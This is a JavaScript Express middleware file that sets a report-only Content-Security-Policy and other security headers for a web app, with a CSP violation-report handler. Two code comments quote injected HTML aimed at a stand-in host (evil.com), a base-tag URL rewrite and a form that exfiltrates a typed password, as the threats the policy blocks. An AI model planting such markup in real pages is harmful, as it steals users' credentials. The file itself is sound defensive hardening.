// Security response headers.
//
// The Content-Security-Policy here is the backstop for the sanitizer bug that
// has not been found yet. `utils/sanitizeHtml.js` is the primary control; this
// is what limits the damage when it is wrong.
//
// CSP SHIPS IN REPORT-ONLY MODE. Turning it on blind on an app with an inline
// bootstrap, a Google Sign-In script, a PayPal SDK and Google Fonts breaks
// something immediately and the breakage looks like an unrelated bug. Run
// report-only, read the reports for a week, then set CSP_ENFORCE=true.

const REPORT_PATH = '/csp-report';

// Third-party origins this app genuinely loads from. Everything else is denied.
// Sources:
//   accounts.google.com  — Google Sign-In (index.html)
//   fonts.googleapis.com / fonts.gstatic.com — Cinzel, Inter, Lora
//   *.paypal.com         — checkout SDK
//   cdnjs.cloudflare.com — permitted for artifact-style embeds
const DIRECTIVES = {
  'default-src': ["'self'"],

  // 'unsafe-inline' is required by the Vite bootstrap and by Google's button.
  // It is the weakest part of this policy and the reason the sanitizer, not
  // CSP, is the primary control. Revisit with a nonce if the frontend build
  // ever emits one.
  'script-src': [
    "'self'",
    "'unsafe-inline'",
    'https://accounts.google.com',
    'https://*.paypal.com',
    'https://cdnjs.cloudflare.com',
  ],

  'style-src': ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
  'font-src': ["'self'", 'https://fonts.gstatic.com', 'data:'],

  // User-uploaded images may come from S3 or a CDN, so this is deliberately
  // broad. It is also why uploads must be served with a non-executable
  // Content-Type and Content-Disposition — see dynamicUpload.
  'img-src': ["'self'", 'data:', 'blob:', 'https:'],

  'connect-src': ["'self'", 'https://accounts.google.com', 'https://*.paypal.com'],
  'frame-src': ["'self'", 'https://accounts.google.com', 'https://*.paypal.com'],

  // No plugins, ever.
  'object-src': ["'none'"],
  // Stops a stored <base href="//evil.com"> rewriting every relative URL on
  // the page — a real escalation path from an HTML injection that CSP catches.
  'base-uri': ["'self'"],
  // Stops a stored <form action="//evil.com"> exfiltrating a typed password.
  'form-action': ["'self'"],
  // Nobody frames this app.
  'frame-ancestors': ["'none'"],
};

const buildPolicy = (extra = {}) => {
  const merged = { ...DIRECTIVES };
  for (const [key, values] of Object.entries(extra)) {
    merged[key] = [...new Set([...(merged[key] || []), ...values])];
  }
  return Object.entries(merged)
    .map(([directive, values]) => `${directive} ${values.join(' ')}`)
    .join('; ');
};

/**
 * @param {object}  options
 * @param {boolean} options.enforce   send CSP rather than CSP-Report-Only
 * @param {boolean} options.reportUri append a report-uri directive
 */
const securityHeaders = ({
  enforce = process.env.CSP_ENFORCE === 'true',
  reportUri = true,
} = {}) => {
  const policy = buildPolicy(reportUri ? { 'report-uri': [REPORT_PATH] } : {});
  const header = enforce ? 'Content-Security-Policy' : 'Content-Security-Policy-Report-Only';

  return function applySecurityHeaders(req, res, next) {
    res.setHeader(header, policy);

    // Do not let a browser second-guess a declared Content-Type. This is what
    // stops an uploaded file whose extension says .png but whose bytes say
    // HTML from being sniffed and executed.
    res.setHeader('X-Content-Type-Options', 'nosniff');

    // Legacy equivalent of frame-ancestors, for browsers that predate CSP 2.
    res.setHeader('X-Frame-Options', 'DENY');

    // Do not leak the full URL of a community page to an external site the
    // user clicks through to. Post URLs can identify a person's interests.
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

    // Nothing in this app needs these.
    res.setHeader(
      'Permissions-Policy',
      'geolocation=(), microphone=(), camera=(), payment=(self "https://www.paypal.com"), usb=(), interest-cohort=()'
    );

    // HSTS is only meaningful over TLS, and sending it in development would
    // pin localhost to https in the browser for a year.
    if (req.secure || req.headers['x-forwarded-proto'] === 'https') {
      res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    }

    next();
  };
};

/**
 * Receives violation reports.
 *
 * Deliberately never fails: a malformed report from a browser extension must
 * not produce an error, and 204 keeps the browser from retrying. Reports are
 * logged rather than stored — the point is a week of reading before enforcing,
 * not a permanent collection.
 */
const cspReportHandler = (req, res) => {
  try {
    const report = req.body && (req.body['csp-report'] || req.body);
    if (report && report['violated-directive']) {
      console.warn('[csp]', {
        directive: report['violated-directive'],
        blocked: report['blocked-uri'],
        document: report['document-uri'],
      });
    }
  } catch (error) {
    // Never throw from a reporting endpoint.
  }
  res.status(204).end();
};

module.exports = { securityHeaders, cspReportHandler, buildPolicy, DIRECTIVES, REPORT_PATH };
